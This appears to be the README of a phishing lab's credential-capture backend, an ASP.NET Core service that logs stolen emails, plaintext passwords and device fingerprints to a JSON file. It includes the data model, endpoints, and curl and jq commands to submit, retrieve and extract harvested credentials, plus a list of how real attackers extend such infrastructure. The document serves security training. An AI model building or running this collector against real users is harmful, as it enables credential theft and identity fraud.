# Backend-Malicious Documentation

## ⚠️ Educational Purpose Only

This code demonstrates credential theft mechanisms for authorized security training only. Unauthorized use violates the Computer Fraud and Abuse Act (CFAA) and constitutes identity theft.

## Overview

The **backend-malicious** is a minimal ASP.NET Core service running on **port 5000** that captures and logs stolen credentials from the phishing attack. It receives plaintext credentials and device fingerprints from the malicious frontend, stores them to a JSON file, and exposes them for attacker retrieval.

## Quick Start

```bash
dotnet restore
dotnet build
dotnet run
```

The application starts on **port 5000**. Health check: `curl http://localhost:5000/api/auth/health`

## Project Structure

```
backend-malicious/
├── Controllers/
│   └── AuthController.cs           (Credential capture endpoints)
├── Services/
│   ├── ICredentialService.cs       (Storage interface)
│   └── CredentialService.cs        (JSON file-based storage)
├── DTOs/
│   └── LoginRequest.cs             (Incoming credentials + fingerprint)
├── Models/
│   └── CapturedCredential.cs       (Stored credential data)
├── Program.cs                      (CORS AllowAll, port 5000)
└── appsettings.json
```

## Technology Stack

| Component | Version | Purpose |
|-----------|---------|---------|
| .NET | 8.0 | Runtime framework |
| ASP.NET Core | 8.0 | Web framework |

**Intentionally minimal**: No database, no encryption, no authentication, no input validation.

## Configuration

**Program.cs** reveals attack infrastructure:
- CORS policy: `AllowAll` (accepts requests from anywhere)
- Port: 5000 (independent from legitimate backend at 3000)
- HTTP Logging: Logs all incoming requests
- No authentication on endpoints

**appsettings.json**:
```json
{
  "Server": {
    "Port": 5000
  },
  "CredentialCapture": {
    "LogsDirectory": ".",
    "CredentialsFilename": "captured_credentials.json"
  }
}
```

## Core Components

### CapturedCredential Model

Stores stolen data structure:

```csharp
public class CapturedCredential
{
    public string Id { get; set; } = Guid.NewGuid().ToString();
    
    // Plaintext Credentials - No Encryption
    public string Email { get; set; }
    public string Password { get; set; }
    
    // Device fingerprint
    public string? SourceIpAddress { get; set; }
    public string? UserAgent { get; set; }
    public string? Timezone { get; set; }
    public string? ScreenResolution { get; set; }
    public string? Language { get; set; }
    public string? Platform { get; set; }
    
    public DateTime CapturedAt { get; set; }
}
```

**Critical flaw**: Passwords stored in **plaintext** without encryption or hashing.

### CredentialService

File-based storage with intentional weaknesses:
- Reads existing JSON file
- Adds new credential to list
- Serializes and overwrites file
- **No encryption, no atomic operations, no concurrency control**

This demonstrates why proper backends use databases with encryption, not JSON files.

## API Endpoints

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/auth/login` | POST | Capture credentials from malicious frontend |
| `/api/auth/logs` | GET | Retrieve all captured credentials (no auth) |
| `/api/auth/health` | GET | Health check |
| `/api/auth/clear` | POST | Clear captured data (lab cleanup) |

### Credential Capture

**Request** (from malicious frontend):
```json
{
  "email": "admin@enterprise.local",
  "password": "Admin@123456",
  "userAgent": "Mozilla/5.0...",
  "timezone": "Europe/Athens",
  "screenResolution": "1920x1080",
  "language": "en-US",
  "platform": "Linux x86_64"
}
```

**Response**: 200 OK

### Attacker Retrieval

**Request**:
```bash
curl http://localhost:5000/api/auth/logs
```

**Response**:
```json
{
  "count": 1,
  "credentials": [
    {
      "id": "a1b2c3d4-...",
      "email": "admin@enterprise.local",
      "password": "Admin@123456",
      "sourceIpAddress": "192.168.102.163",
      "timezone": "Europe/Athens",
      "screenResolution": "1920x1080",
      "language": "en-US",
      "platform": "Linux x86_64",
      "capturedAt": "2025-12-08T22:30:15Z"
    }
  ],
  "exportedAt": "2025-12-08T22:35:42Z"
}
```

** No authentication required** - any attacker can retrieve credentials.

## Attack Data Flow

```
Malicious Frontend (port 80)
  ↓ User submits credentials
  ↓ Collects device fingerprint
  ↓ POST to http://localhost:5000/api/auth/login
  ↓
Backend-Malicious (port 5000)
  ↓ AuthController.Capture() receives request
  ↓ No validation, no checks
  ↓ CredentialService saves to ./captured_credentials.json
  ↓ Returns 200 OK
  ↓
Attacker later
  ↓ GET http://localhost:5000/api/auth/logs
  ↓ Retrieves all credentials in plaintext
```

## Storage Location

Captured credentials stored in:
```
<project-directory>/backend-malicious/captured_credentials.json
```

**Querying captured data**:
```bash
# View all
cat ./captured_credentials.json | jq '.'

# Count
cat ./captured_credentials.json | jq 'length'

# Extract emails and passwords
cat ./captured_credentials.json | jq '.[] | {email, password}'
```

## Security Weaknesses Demonstrated

| Weakness | Impact |
|----------|--------|
| **Plaintext passwords** | Immediately compromised |
| **No encryption at rest** | Filesystem access = credential theft |
| **No input validation** | Accepts malformed data |
| **No authentication** | Anyone retrieves captured credentials |
| **No database** | No durability, no scalability |
| **JSON serialization** | Inefficient, slow, race conditions |
| **No audit logging** | No record of who accessed credentials |

## Testing

### Health Check
```bash
curl http://localhost:5000/api/auth/health
```

### Capture Credentials (Simulated Frontend)
```bash
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@enterprise.local",
    "password": "TestPassword123",
    "timezone": "Europe/Bucharest",
    "screenResolution": "1920x1080"
  }'
```

### Retrieve Captured Data
```bash
curl http://localhost:5000/api/auth/logs | jq '.count'
```

## Real-World Evolution

This malicious backend demonstrates **early-stage attack infrastructure**. Real attackers add:

- **Database** instead of JSON (PostgreSQL, MongoDB)
- **Encryption** of credentials (AES-256)
- **Authentication** to logs (API keys)
- **Rate Limiting** (prevent detection)
- **Exfiltration** to attacker server
- **Cleanup** after stealing (delete evidence)
- **C2 Integration** (report to command-and-control)

## Key Differences from Legitimate Backend

| Aspect | Legitimate (Port 3000) | Malicious (Port 5000) |
|--------|---|---|
| **Purpose** | Authenticate users | Capture credentials |
| **Storage** | SQLite database | JSON file |
| **Passwords** | BCrypt hashed | Plaintext |
| **Validation** | Comprehensive | None |
| **Authentication** | Yes (user/password) | No |
| **Access Control** | Yes (active user check) | No |
| **CORS** | Restricted to specific origins | AllowAll |
| **Data Protection** | Yes (hashing, encryption) | No |

## References

- [OWASP Credential Harvesting](https://owasp.org/www-community/attacks/Credential_harvesting)
- [CWE-256: Plaintext Storage of Password](https://cwe.mitre.org/data/definitions/256.html)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
